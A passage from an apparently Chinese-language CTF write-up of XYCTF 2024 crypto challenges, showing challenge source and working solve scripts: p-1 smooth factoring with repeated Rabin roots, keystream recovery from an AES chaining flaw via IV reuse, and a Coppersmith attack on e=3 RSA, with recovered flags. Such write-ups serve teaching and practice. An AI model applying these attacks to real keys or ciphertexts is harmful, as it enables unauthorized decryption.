class="hljs-string">XYCTF&#123;a83211a70e18145a59671c08ddc67ba4&#125;</span><br><span class="hljs-string">True</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<p>这里用wiener也可以，只不过需要在多组k,d解出的p,q验证。应为d为512位，n^3有512 * 2 * 3位，delta&#x3D;0.1666···，满足条件</p>
<h3 id="第四题：babyRSAMAX"><a href="#第四题：babyRSAMAX" class="headerlink" title="第四题：babyRSAMAX"></a>第四题：babyRSAMAX</h3><p>题目：</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs 1c">from Crypto.Util.number import *<br>from gmpy2 import *<br>from random import choice<br><br>flag = b&#x27;XYCTF&#123;******&#125;&#x27;<br>e = &#x27;?&#x27;<br>def getBabyPrime(nbits):<br>    while True:<br>        p = <span class="hljs-number">1</span><br>        while p.bit_length() &lt;= nbits:<br>            p *= choice(sieve_base)<br>        <br>        if isPrime(p+<span class="hljs-number">1</span>):<br>            return p+<span class="hljs-number">1</span><br><br>p = getBabyPrime(<span class="hljs-number">512</span>)<br>q = getBabyPrime(<span class="hljs-number">512</span>)<br>n = p*q<br>gift1 = (<span class="hljs-built_in">pow</span>(p,e,n)-<span class="hljs-built_in">pow</span>(q,e,n)) % n<br>gift2 = <span class="hljs-built_in">pow</span>(p+q,e,n)<br><br>t = <span class="hljs-number">65537</span><br>x = bytes_to_long(e)<br>y = <span class="hljs-built_in">pow</span>(x, t, n)<br><br>m = bytes_to_long(flag)<br>c = powmod(m, e, n)<br><br>print(f&#x27;n = &#123;n&#125;&#x27;)<br>print(f&#x27;gift1 = &#123;gift1&#125;&#x27;)<br>print(f&#x27;gift2 = &#123;gift2&#125;&#x27;)<br>print(f&#x27;c = &#123;c&#125;&#x27;)<br>print(f&#x27;y = &#123;y&#125;&#x27;)<br><br>&#x27;&#x27;&#x27;<br>n = <span class="hljs-number">39332423872740</span><span class="hljs-number">21078324606903</span><span class="hljs-number">08559462441049</span><span class="hljs-number">82381157166843</span><span class="hljs-number">97759978023391</span><span class="hljs-number">11831585609013</span><span class="hljs-number">77359925435092</span><span class="hljs-number">32665330396426</span><span class="hljs-number">15501586585515</span><span class="hljs-number">18626014048783</span><span class="hljs-number">43524547153695</span><span class="hljs-number">98448740365169</span><span class="hljs-number">31542444719549</span><span class="hljs-number">99797148264490</span><span class="hljs-number">55234594077753</span><span class="hljs-number">92702211086149</span><span class="hljs-number">27947378479620</span><span class="hljs-number">20202819097067</span><span class="hljs-number">23380472571862</span><span class="hljs-number">79200368742379</span><span class="hljs-number">15765300857477</span><span class="hljs-number">16706475220532</span>321<br>gift1 = <span class="hljs-number">45494024447463</span><span class="hljs-number">38327349007235</span><span class="hljs-number">81818779395028</span><span class="hljs-number">51050917261675</span><span class="hljs-number">73552412678416</span><span class="hljs-number">75969466016695</span><span class="hljs-number">67827556314472</span><span class="hljs-number">71662108564084</span><span class="hljs-number">38209856299995</span><span class="hljs-number">02287083009022</span><span class="hljs-number">01571583419116</span><span class="hljs-number">29993226447838</span><span class="hljs-number">11970344023384</span><span class="hljs-number">81872937576172</span><span class="hljs-number">19720251977078</span><span class="hljs-number">24583436060605</span><span class="hljs-number">44694608852844</span><span class="hljs-number">22840045723210</span><span class="hljs-number">09042170629140</span><span class="hljs-number">47342663534138</span><span class="hljs-number">66849032840002</span><span class="hljs-number">26518165973673</span>10<br>gift2 = <span class="hljs-number">11106121599895</span><span class="hljs-number">97099207364480</span><span class="hljs-number">50860427855012</span><span class="hljs-number">02681537667206</span><span class="hljs-number">76012440535805</span><span class="hljs-number">66359594802604</span><span class="hljs-number">25199298638218</span><span class="hljs-number">78910225832479</span><span class="hljs-number">97994146019970</span><span class="hljs-number">44524750911971</span><span class="hljs-number">94113107604919</span><span class="hljs-number">83876636264003</span><span class="hljs-number">94287075640232</span><span class="hljs-number">86340921467998</span><span class="hljs-number">25005835867245</span><span class="hljs-number">56342013525304</span><span class="hljs-number">82238983344600</span><span class="hljs-number">67523975023732</span><span class="hljs-number">15323079113687</span><span class="hljs-number">03243022591271</span><span class="hljs-number">59852763634051</span><span class="hljs-number">23881196916101</span><span class="hljs-number">1462</span><br>c = <span class="hljs-number">16938927825234</span><span class="hljs-number">40726702601756</span><span class="hljs-number">10454902656984</span><span class="hljs-number">91840814929432</span><span class="hljs-number">15283974503594</span><span class="hljs-number">61187437145666</span><span class="hljs-number">23315033802681</span><span class="hljs-number">00901769552637</span><span class="hljs-number">43973703439843</span><span class="hljs-number">60997903165842</span><span class="hljs-number">59141420319718</span><span class="hljs-number">49465884703557</span><span class="hljs-number">28984912522040</span><span class="hljs-number">74469197481963</span><span class="hljs-number">01181639762592</span><span class="hljs-number">46941579063687</span><span class="hljs-number">85799419330955</span><span class="hljs-number">41298162689316</span><span class="hljs-number">72391946592680</span><span class="hljs-number">57868127069358</span><span class="hljs-number">99110214657524</span><span class="hljs-number">54315629283033</span>043<br>y = <span class="hljs-number">18136500012709</span><span class="hljs-number">67709841306491</span><span class="hljs-number">29771690896942</span><span class="hljs-number">52488885109851</span><span class="hljs-number">09381881270362</span><span class="hljs-number">75503138556492</span><span class="hljs-number">78693131125405</span><span class="hljs-number">34780853966341</span><span class="hljs-number">04452685670558</span><span class="hljs-number">90202950484733</span><span class="hljs-number">05762088786992</span><span class="hljs-number">44635006002488</span><span class="hljs-number">11177410412603</span><span class="hljs-number">91405962817182</span><span class="hljs-number">67442171523919</span><span class="hljs-number">72112746684509</span><span class="hljs-number">47666394594121</span><span class="hljs-number">76433379413830</span><span class="hljs-number">84421241147448</span><span class="hljs-number">92164155894256</span><span class="hljs-number">32696160513747</span><span class="hljs-number">92860829645202</span>17<br><br>&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure>

<p>存在关系：<br>$$<br>gift1 &#x3D; p^e -q^e mod n<br>$$</p>
<p>$$<br>gift2 &#x3D; (p+q)^e mod n<br>$$</p>
<p>$$<br>y&#x3D;e^{65537} mod n<br>$$</p>
<p>$$<br>c&#x3D;m^e mod n<br>$$</p>
<p>这里暂不知道题目为什么给两个gift，可能是非预期，因为p,q的生成是<br>$$<br>p_1*p_2**p_n+1<br>$$<br>可以用p-1光滑攻击</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs 1c">n = <span class="hljs-number">39332423872740210783246069030855946244104982381157166843977599780233911183158560901377359925435092326653303964261550158658551518626014048783435245471536959844874036516931542444719549997971482644905523459407775392702211086149279473784796202020281909706723380472571862792003687423791576530085747716706475220532321</span><br><br><span class="hljs-meta"># decode: 利用 p-1 光滑攻击分解出 p,q</span><br>from gmpy2 import *<br>a = <span class="hljs-number">2</span><br>N = n<br>n = <span class="hljs-number">2</span><br>while True:<br>    a = powmod(a, n, N)<br>    res = gcd(a-<span class="hljs-number">1</span>, N)<br>    if res != <span class="hljs-number">1</span> and res != N:<br>        q = N <span class="hljs-comment">// res</span><br>        print(res*q==N)<br>        print(&#x27;p=&#x27;,res)<br>        print(&#x27;q=&#x27;,q)<br>        break<br>    n += <span class="hljs-number">1</span><br>&#x27;&#x27;&#x27;<br>True<br>p= <span class="hljs-number">23643840047752</span><span class="hljs-number">15979229504451</span><span class="hljs-number">53796265199072</span><span class="hljs-number">40457718319095</span><span class="hljs-number">31148051705228</span><span class="hljs-number">75904551780358</span><span class="hljs-number">33876944055881</span><span class="hljs-number">63511052537949</span><span class="hljs-number">64040981919231</span><span class="hljs-number">48409809767108</span><span class="hljs-number">48953022874254</span>79<br>q= <span class="hljs-number">16635378937305</span><span class="hljs-number">73521952685751</span><span class="hljs-number">68397750362643</span><span class="hljs-number">82220125350894</span><span class="hljs-number">10528359454206</span><span class="hljs-number">24983216456266</span><span class="hljs-number">47817657965149</span><span class="hljs-number">00806969738496</span><span class="hljs-number">07356408696043</span><span class="hljs-number">71849249999306</span><span class="hljs-number">28634154245781</span>99<br>&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure>

<p>得到p,q后，就可以求出e</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">y = 1813650001270967709841306491297716908969425248888510985109381881270362755031385564927869313112540534780853966341044526856705589020295048473305762088786992446350060024881117741041260391405962817182674421715239197211274668450947666394594121764333794138308442124114744892164155894256326961605137479286082964520217<br>p= 236438400477521597922950445153796265199072404577183190953114805170522875904551780358338769440558816351105253794964040981919231484098097671084895302287425479<br>q= 166353789373057352195268575168397750362643822201253508941052835945420624983216456266478176579651490080696973849607356408696043718492499993062863415424578199<br><span class="hljs-built_in">print</span>(<span class="hljs-attribute">n</span>==p*q)<br><span class="hljs-attribute">d</span>=inverse(65537,(p-1)*(q-1))<br><span class="hljs-built_in">print</span>(long_to_bytes(pow(y,d,n)))<br><span class="hljs-comment">#b&#x27;XYCTF&#123;e==4096&#125;&#x27;</span><br></code></pre></td></tr></table></figure>

<p>很明显e&#x3D;2^12,采用多轮rabin攻击</p>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs vim">from Crypto.Util.<span class="hljs-keyword">number</span> import *<br><span class="hljs-keyword">e</span>=<span class="hljs-number">4096</span><br><span class="hljs-keyword">c</span> = <span class="hljs-number">16938927825234407267026017561045490265698491840814929432152839745035946118743714566623315033802681009017695526374397370343984360997903165842591414203197184946588470355728984912522040744691974819630118163976259246941579063687857994193309554129816268931672391946592680578681270693589911021465752454315629283033043</span><br><span class="hljs-keyword">p</span>= <span class="hljs-number">236438400477521597922950445153796265199072404577183190953114805170522875904551780358338769440558816351105253794964040981919231484098097671084895302287425479</span><br>q= <span class="hljs-number">166353789373057352195268575168397750362643822201253508941052835945420624983216456266478176579651490080696973849607356408696043718492499993062863415424578199</span><br><br>def repeat_rabin(<span class="hljs-keyword">x</span>,<span class="hljs-keyword">e</span>,<span class="hljs-keyword">p</span>,q):<br>    n = <span class="hljs-keyword">p</span> * q<br>    x0=gmpy2.<span class="hljs-built_in">invert</span>(<span class="hljs-keyword">p</span>,q)<br>    x1=gmpy2.<span class="hljs-built_in">invert</span>(q,<span class="hljs-keyword">p</span>)<br>    <span class="hljs-keyword">cs</span> = [<span class="hljs-keyword">c</span>]<br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-keyword">x</span>):<br>        <span class="hljs-keyword">ps</span> = []<br>        <span class="hljs-keyword">for</span> c2 in <span class="hljs-keyword">cs</span>:<br>            r = <span class="hljs-built_in">pow</span>(c2, (<span class="hljs-keyword">p</span> + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, <span class="hljs-keyword">p</span>)<br>            s = <span class="hljs-built_in">pow</span>(c2, (q + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, q)<br>            <span class="hljs-keyword">x</span> = (r * x1 * q + s * x0 * <span class="hljs-keyword">p</span>) % n<br>            <span class="hljs-keyword">y</span> = (r * x1 * q - s * x0 * <span class="hljs-keyword">p</span>) % n<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">x</span> not in <span class="hljs-keyword">ps</span>:<br>                <span class="hljs-keyword">ps</span>.<span class="hljs-keyword">append</span>(<span class="hljs-keyword">x</span>)<br>            <span class="hljs-keyword">if</span> n - <span class="hljs-keyword">x</span> not in <span class="hljs-keyword">ps</span>:<br>                <span class="hljs-keyword">ps</span>.<span class="hljs-keyword">append</span>(n - <span class="hljs-keyword">x</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">y</span> not in <span class="hljs-keyword">ps</span>:<br>                <span class="hljs-keyword">ps</span>.<span class="hljs-keyword">append</span>(<span class="hljs-keyword">y</span>)<br>            <span class="hljs-keyword">if</span> n - <span class="hljs-keyword">y</span> not in <span class="hljs-keyword">ps</span>:<br>                <span class="hljs-keyword">ps</span>.<span class="hljs-keyword">append</span>(n - <span class="hljs-keyword">y</span>)<br>        <span class="hljs-keyword">cs</span> = <span class="hljs-keyword">ps</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">cs</span><br><span class="hljs-keyword">ps</span>=repeat_rabin(<span class="hljs-number">12</span>,<span class="hljs-keyword">e</span>,<span class="hljs-keyword">p</span>,q)<br><span class="hljs-keyword">for</span> <span class="hljs-keyword">m</span> in <span class="hljs-keyword">ps</span>:<br>    <span class="hljs-keyword">print</span>(long_to_bytes(<span class="hljs-keyword">m</span>))<br><br></code></pre></td></tr></table></figure>

<img src="/2024/04/29/XYCTF2024WP/image-20240401222652666.png" srcset="/img/loading.gif" lazyload class title="image-20240401222652666">

<h3 id="第5题：xor"><a href="#第5题：xor" class="headerlink" title="第5题：xor"></a>第5题：xor</h3><p>题目：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">import</span> os<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()<br>key = os.urandom(<span class="hljs-number">16</span>)<br>iv = os.urandom(<span class="hljs-number">16</span>)<br>flag = pad(flag, <span class="hljs-number">16</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_encrypt</span>(<span class="hljs-params">key, plaintext</span>):<br>    cipher = AES.new(key, AES.MODE_ECB)<br>    <span class="hljs-keyword">return</span> cipher.encrypt(plaintext)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">key, plaintext, iv</span>):<br>    ciphertext = <span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(plaintext), AES.block_size):<br>        key_block = aes_encrypt(key, iv)<br>        ciphertext_block = <span class="hljs-built_in">bytes</span>(<br>            [plaintext[i + j] ^ key_block[j] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(AES.block_size)]<br>        )<br>        ciphertext += ciphertext_block<br>        iv = key_block<br>    <span class="hljs-keyword">return</span> ciphertext<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1.print\n2.input\n3.exit&quot;</span>)<br>        a = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>        <span class="hljs-keyword">if</span> a == <span class="hljs-string">&quot;1&quot;</span>:<br>            <span class="hljs-built_in">print</span>((iv + encrypt(key, flag, iv)).<span class="hljs-built_in">hex</span>())<br>        <span class="hljs-keyword">elif</span> a == <span class="hljs-string">&quot;2&quot;</span>:<br>            ivs = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;iv: &quot;</span>))<br>            inputs = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;message: &quot;</span>))<br>            <span class="hljs-built_in">print</span>(encrypt(key, inputs, ivs).<span class="hljs-built_in">hex</span>())<br>        <span class="hljs-keyword">elif</span> a == <span class="hljs-string">&quot;3&quot;</span>:<br>            exit(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;You need input 1,2,3&quot;</span>)<br>    <span class="hljs-keyword">except</span>:exit(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>

<p>分析代码可知，加密过程是异或操作，每一轮的密钥由上一轮的iv经过AES的ECB模式加密得到，加密的key未知。</p>
<p>题目两个功能，1选项，给出初始iv和加密后的flag密文，暂时不知道如何解密，缺少key或者每轮的key_block,2选项，输入iv和一个明文，得到其加密后的密文。</p>
<p>关键点在这里，已知明文密文，加密过程是异或，能否求出key_block。但key_block是AES加密的，由key和iv得到，key全程未知，初始iv已知，故不可能我们正向得到key_block，那么能否逆向得到加密后的key_block呢？</p>
<p>这里选择2允许我们自定义加密明文和密文，我们可以令ivs为初始iv，那么两次加密过程的每轮key_block一样，故先输入1，获取初始iv和flag_c，再输入2，令两次初始iv相同，根据得到的明文密文求出每轮key_block，再求解。</p>
<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">flag_c</span>=<span class="hljs-string">&#x27;600106b927db260469a566518b6e64aa69018fcbed26078a3f7df0108be6f753d67bda6bf16dbf1de6ebe8c1aa134abe3ef6c0b1ccc140f5ff08a86a1a04afc5&#x27;</span><br><br><span class="hljs-attribute">flag_c</span>=bytes.fromhex(flag_c)<br>flag_iv,<span class="hljs-attribute">flag_c</span>=flag_c[:16],flag_c[16:]<br><br><span class="hljs-attribute">iv</span>=flag_iv.hex()<br><span class="hljs-attribute">iv</span>=bytes.fromhex(iv)<br><span class="hljs-attribute">m</span>=iv*3<br><span class="hljs-attribute">c</span>=<span class="hljs-string">&#x27;5159ca268c8611b960bea22262bfbe9c834db9ffe2d5ae2ca22fbca240501c766ac7a26edd785497a59eb331956ecf6b&#x27;</span><br><span class="hljs-attribute">c</span>=bytes.fromhex(c)<br><br><br><span class="hljs-attribute">iv_c</span>=bytes(c[i]^m[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(16<span class="hljs-number">*3</span>))<br><span class="hljs-attribute">c</span>=b&#x27;&#x27;<br>key_block = iv_c<span class="hljs-number">*3</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0,48,16):<br>    ciphertext_block = bytes(<br>        [flag_c[i+j] ^ key_block[i+j] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(16)]<br>    )<br>    c += ciphertext_block<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-comment">#b&#x27;XYCTF&#123;076f4cb7-e57e-4c75-a22a-2b40df6b2f33&#125;\n\x04\x04\x04\x04&#x27;</span><br></code></pre></td></tr></table></figure>

<h3 id="第6题：反方向的密码-相思"><a href="#第6题：反方向的密码-相思" class="headerlink" title="第6题：反方向的密码 相思"></a>第6题：反方向的密码 相思</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> flag<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hash</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> hashlib.sha256(x.encode()).digest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">message</span>):<br>    <span class="hljs-keyword">return</span> message + <span class="hljs-built_in">hash</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(message)))<br><br><br>m = bytes_to_long(pad(flag))<br>p = getStrongPrime(<span class="hljs-number">512</span>)<br>q = getStrongPrime(<span class="hljs-number">512</span>)<br>n = p * q<br>e = <span class="hljs-number">3</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(m, e, n))<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-comment"># 120440199294949712392334113337541924034371176306546446428347114627162894108760435789068328282135879182130546564535108930827440004987170619301799710272329673259390065147556073101312748104743572369383346039000998822862286001416166288971531241789864076857299162050026949096919395896174243383291126202796610039053</span><br><span class="hljs-comment"># 143413213355903851638663645270518081058249439863120739973910994223793329606595495141951165221740599158773181585002460087410975579141155680671886930801733174300593785562287068287654547100320094291092508723488470015821072834947151827362715749438612812148855627557719115676595686347541785037035334177162406305243</span><br><br></code></pre></td></tr></table></figure>

<p>代码很简单就是个RSA加密，但生成的素数是强素数，无法分解，注意到e&#x3D;3,想到低加密指数攻击，但开方出来不对，可能是$m^e$&gt;n,尝试爆破k，还是没能求解。仔细观察，发现明文经过hash填充，仔细想想，一个flag内容算10个字符内容吗，加上XYCTF{},有17 * 8 &#x3D;136位，加上填充256位，再3次方有1176位，k就有100多位大小，不太可能爆破出来。又尝试能否有限域开方，失败。</p>
<p>仔细观察代码。这里不是对flag内容的hash填充，而是对长度，因此一个flag长度再怎么也在100以内，故填充内容可以爆破得知。现在已知明文低位，以及明文部分高位，尝试coppersmith求中间位。这里，需要调整一下small_roots的参数。</p>
<h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">c=<span class="hljs-number">120440199294949712392334113337541924034371176306546446428347114627162894108760435789068328282135879182130546564535108930827440004987170619301799710272329673259390065147556073101312748104743572369383346039000998822862286001416166288971531241789864076857299162050026949096919395896174243383291126202796610039053</span><br>n=<span class="hljs-number">143413213355903851638663645270518081058249439863120739973910994223793329606595495141951165221740599158773181585002460087410975579141155680671886930801733174300593785562287068287654547100320094291092508723488470015821072834947151827362715749438612812148855627557719115676595686347541785037035334177162406305243</span><br>e = <span class="hljs-number">3</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>m0=bytes_to_long(b<span class="hljs-string">&#x27;XYCTF&#123;&#x27;</span>)<br>m3=bytes_to_long(b<span class="hljs-string">&#x27;&#125;&#x27;</span>)<br>def hash(x):<br>    a=hashlib.sha256(x.encode()).digest()<br>    <span class="hljs-keyword">return</span> a<br>num=<span class="hljs-number">256</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>,<span class="hljs-number">47</span>):<br>    R.&lt;x&gt; = PolynomialRing(Zmod(n))<br>    m2=bytes_to_long(hash(str(i)))<br>    N=((m0*<span class="hljs-number">2</span>^(<span class="hljs-number">8</span>*(i<span class="hljs-number">-6</span>))+x*<span class="hljs-number">2</span>^<span class="hljs-number">8</span>+m3)*<span class="hljs-number">2</span>^num+m2)^e-c<br>    N=N.monic()<br>    m=N.small_roots(x=<span class="hljs-number">2</span>^(<span class="hljs-number">8</span>*(i<span class="hljs-number">-7</span>)), beta=<span class="hljs-number">1</span>, epsilon=<span class="hljs-number">0.05</span>)<br>    <span class="hljs-built_in">print</span>(i,(<span class="hljs-number">8</span>*(i<span class="hljs-number">-7</span>)),m)<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-name">m</span>:<br>        <span class="hljs-built_in">print</span>(long_to_bytes(x*<span class="hljs-number">2</span>^<span class="hljs-number">8</span>+m3))<br>        <span class="hljs-built_in">print</span>(long_to_bytes((m0*<span class="hljs-number">2</span>^(<span class="hljs-number">8</span>*(i<span class="hljs-number">-6</span>))+x*<span class="hljs-number">2</span>^<span class="hljs-number">8</span>+m3)*<span class="hljs-number">2</span>^num+m2))<br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">38 248 [58964190787951927773278389967057377362495121527440001979648729026891046689]</span><br><span class="hljs-string">b&#x27;</span>!__d3ng__hu0__1@n__3h@n__Chu__!&#125;<span class="hljs-string">&#x27;</span><br><span class="hljs-string">b&#x27;</span>XYCTF&#123;!__d3ng__hu0__1@n__3h@n__Chu__!&#125;\xae\xa9!<span class="hljs-number">2</span>\xc4\xcb\xeb&amp;&gt;j\xc2\xbfl\x18;]\x81s\x7f\x17\x9f!\xef\xdcXcs\x96r\xf0\xf4p<span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<h3 id="第7题：Complex-dlp"><a href="#第7题：Complex-dlp" class="headerlink" title="第7题：Complex_dlp"></a>第7题：Complex_dlp</h3><p>源码：</p>
